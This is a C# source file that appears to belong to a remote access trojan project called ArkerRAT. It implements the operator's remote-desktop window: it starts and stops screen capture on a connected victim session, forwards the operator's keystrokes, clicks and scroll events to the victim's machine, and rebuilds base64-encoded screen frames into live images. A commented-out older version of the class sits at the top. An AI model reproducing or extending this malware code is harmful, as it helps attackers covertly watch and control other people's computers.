//using ArkerRAT1;
//using System;
//using System.Collections.Concurrent;
//using System.Collections.Generic;
//using System.Drawing;
//using System.Drawing.Imaging;
//using System.IO;
//using System.Linq;
//using System.Text;
//using System.Threading;
//using System.Threading.Tasks;
//using System.Windows;
//using System.Windows.Controls;
//using System.Windows.Data;
//using System.Windows.Documents;
//using System.Windows.Input;
//using System.Windows.Media;
//using System.Windows.Media.Animation;
//using System.Windows.Media.Imaging;
//using System.Windows.Shapes;

//namespace ArkerRatWpfVersion
//{
//    /// <summary>
//    /// Interaction logic for RemoteDesktopWindow.xaml
//    /// </summary>
//    public partial class RemoteDesktopWindow : Window
//    {
//        public RATHostSession clientSession { get; set; }
//        //A thread safe alternative for lists, and won get out of index.
//        private Thread _frameRetrieverThread;
//        public bool _isRunning = false;

//        public RemoteDesktopWindow(RATHostSession session)
//        {
//            InitializeComponent();
//            clientSession = session;
//            clientSession.SendData("§RemoteDesktopStart§§RemoteDesktopEnd§");
//            clientSession.remoteDesktopWindowIsAlreadyOpen = true;
//        }

//        private async void CloseWindow(object sender, RoutedEventArgs e)
//        {
//            Close();
//            clientSession.SendData("§RemoteDesktopStart§§RemoteDesktopEnd§");
//            clientSession.remoteDesktopWindowIsAlreadyOpen = false;
//        }

//        private void MaximizeWindow(object sender, RoutedEventArgs e)
//        {

//        }

//        private void MinimizeWindow(object sender, RoutedEventArgs e)
//        {
//            this.WindowState = WindowState.Minimized;
//        }

//        private void Window_MouseDown(object sender, MouseButtonEventArgs e)
//        {
//            if (e.LeftButton == MouseButtonState.Pressed)
//            {
//                DragMove();
//            }
//        }
//        //_______________________________________________________________________________



//        public void OnNewFrameRecieved(string chunk)
//        {
//            lock(GlobalVariables._lock)
//            {
//                _frameHandler.AddChunk(chunk);
//            }
//        }

//    }



//}

using ArkerRAT1;
using System;
using System.Collections.Generic;
using System.Drawing.Imaging;
using System.IO;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Windows.Controls;
using System.Windows.Input;
using System.Windows.Media;
using System.Windows.Media.Animation;
using System.Windows.Media.Imaging;

namespace ArkerRatWpfVersion
{
    /// <summary>
    /// Interaction logic for RemoteDesktopWindow.xaml
    /// </summary>
    public partial class RemoteDesktopWindow : Window
    {
        public RATHostSession clientSession { get; set; }

        public RemoteDesktopWindow(RATHostSession session)
        {
            InitializeComponent();
            clientSession = session;
            GlobalVariables.byteSize = 262144;
            lock (GlobalVariables._lock)
            {
                clientSession.data = string.Empty;
            }
            clientSession.SendData("§RemoteDesktopStart§§RemoteDesktopEnd§");
            clientSession.remoteDesktopWindowIsAlreadyOpen = true;
            this.PreviewKeyDown += new KeyEventHandler(SendKeystrokesToClient);
            this.PreviewMouseWheel+= new MouseWheelEventHandler(SendScrollToClient);
        }

        private async void SendScrollToClient(object sender, MouseWheelEventArgs e)
        {
            e.Handled = true; // Mark the event as handled to prevent it from bubbling up to the window

            Point relativeClickPos = e.GetPosition(remoteDesktopVideoFrame);

            double clickX = relativeClickPos.X * Convert.ToDouble(clientSession.resulotion[1]) / remoteDesktopVideoFrame.ActualWidth;
            double clickY = relativeClickPos.Y * Convert.ToDouble(clientSession.resulotion[0]) / remoteDesktopVideoFrame.ActualHeight;

            await clientSession.SendData("§RemoteDesktopStart§§ClickPositionStart§" + Convert.ToString(clickX) + "," + Convert.ToString(clickY) + "," + e.Delta.ToString() + "§ClickPositionEnd§§RemoteDesktopEnd§");
        }
        private async void SendKeystrokesToClient(object sender, KeyEventArgs e)
        {
            e.Handled = true;
            await clientSession.SendData("§RemoteDesktopStart§" + "§KI§"+e.Key.ToString().ToLower()+"§RemoteDesktopEnd§");
        }

        private async void CloseWindow(object sender, RoutedEventArgs e)
        {
            clientSession.SendData("§RemoteDesktopStart§close§RemoteDesktopEnd§");
            clientSession.remoteDesktopWindowIsAlreadyOpen = false;
            GlobalVariables.byteSize = 1024;
            Close();
        }

        bool zoom = true;
        private void MaximizeWindow(object sender, RoutedEventArgs e)
        {
            if (zoom)
            {
                this.Width = this.Width * 2;
                this.Height = this.Height * 2;
                zoom = false;
            }
            else
            {
                this.Width = this.Width /2;
                this.Height = this.Height / 2;
                zoom= true;
            }
            
        }

        private void MinimizeWindow(object sender, RoutedEventArgs e)
        {
            this.WindowState = WindowState.Minimized;
        }

        private async void ImageControl_PreviewMouseDown(object sender, MouseButtonEventArgs e)
        {
            e.Handled = true; // Mark the event as handled to prevent it from bubbling up to the window

            Point relativeClickPos = e.GetPosition(remoteDesktopVideoFrame);

            double clickX = relativeClickPos.X * Convert.ToDouble(clientSession.resulotion[1]) / remoteDesktopVideoFrame.ActualWidth;
            double clickY = relativeClickPos.Y * Convert.ToDouble(clientSession.resulotion[0]) / remoteDesktopVideoFrame.ActualHeight;

            await clientSession.SendData("§RemoteDesktopStart§§ClickPositionStart§" + Convert.ToString(clickX) + "," + Convert.ToString(clickY)+","+e.ChangedButton.ToString() + "§ClickPositionEnd§§RemoteDesktopEnd§");
        }

        private void Window_MouseDown(object sender, System.Windows.Input.MouseButtonEventArgs e)
        {
            if (e.LeftButton == System.Windows.Input.MouseButtonState.Pressed)
            {
                DragMove();
            }
        }

        private List<byte[]> _frameChunks = new List<byte[]>();

        public void ReceiveFrameChunk(string frameChunk)
        {

            if (frameChunk == "§RemoteDesktopFrameDone§")
            {

                byte[] frameBytes = CombineFrameChunks();

                Application.Current.Dispatcher.BeginInvoke(new Action(() =>
                {
                    try
                    {
                        using (MemoryStream ms = new MemoryStream(frameBytes))
                        {
                            BitmapImage bitmapImage = new BitmapImage();
                            bitmapImage.BeginInit();
                            bitmapImage.CacheOption = BitmapCacheOption.OnLoad;
                            bitmapImage.StreamSource = ms;
                            bitmapImage.EndInit();

                            remoteDesktopVideoFrame.Source = bitmapImage;
                        }
                    }
                    catch (Exception ex) { }
                }));

                _frameChunks.Clear();

            }
            else
            {
                try
                {
                  
                        byte[] chunkBytes = Convert.FromBase64String(frameChunk);
                        _frameChunks.Add(chunkBytes);
                    
                }
                catch (Exception ex) { return; }
            }
        }

        private byte[] CombineFrameChunks()
        {
            int totalLength = 0;
            

           
                foreach (byte[] chunk in _frameChunks)
                {
                    totalLength += chunk.Length;
                }
                byte[] frameBytes = new byte[totalLength];
                int currentIndex = 0;

                foreach (byte[] chunk in _frameChunks)
                {
                    Buffer.BlockCopy(chunk, 0, frameBytes, currentIndex, chunk.Length);
                    currentIndex += chunk.Length;
                }
                return frameBytes;
            


        }
    }
}
